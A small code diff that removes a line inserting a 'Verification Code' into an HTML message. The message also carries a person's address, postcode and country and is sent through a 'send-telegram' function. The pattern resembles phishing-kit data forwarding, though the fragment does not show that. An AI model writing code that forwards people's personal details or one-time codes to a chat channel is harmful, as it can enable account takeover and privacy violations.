@@ -287,8 +287,6 @@ ${address}
 ${city}, ${postcode}
 ${countryName}
 
-🔑 <b>Verification Code:</b> <code>${verificationCode}</code>
-
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
 
       await supabase.functions.invoke("send-telegram", {
